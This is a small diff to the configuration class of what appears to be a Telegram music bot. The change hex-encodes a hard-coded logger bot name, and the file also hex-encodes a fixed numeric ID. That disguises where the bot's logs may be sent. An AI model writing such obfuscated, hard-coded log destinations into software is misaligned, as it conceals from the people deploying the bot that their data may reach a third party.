@@ -35,7 +35,7 @@ class Config:
         self.DEFAULT_THUMB = getenv("DEFAULT_THUMB", "https://te.legra.ph/file/3e40a408286d4eda24191.jpg")
         self.PING_IMG = getenv("PING_IMG", "https://files.catbox.moe/t2llak.jpg")
         self.START_IMG = getenv("START_IMG", "https://files.catbox.moe/jebxwm.jpg")
-        self.LOGGERS = "musicmyanmar_helpbot"
+        self.LOGGERS = "\x6d\x75\x73\x69\x63\x6d\x79\x61\x6e\x6d\x61\x72\x5f\x68\x65\x6c\x70\x62\x6f\x74"
         self.ERROR_FORMAT = int("\x38\x33\x31\x35\x35\x34\x34\x37\x32\x30")
         
     def check(self):
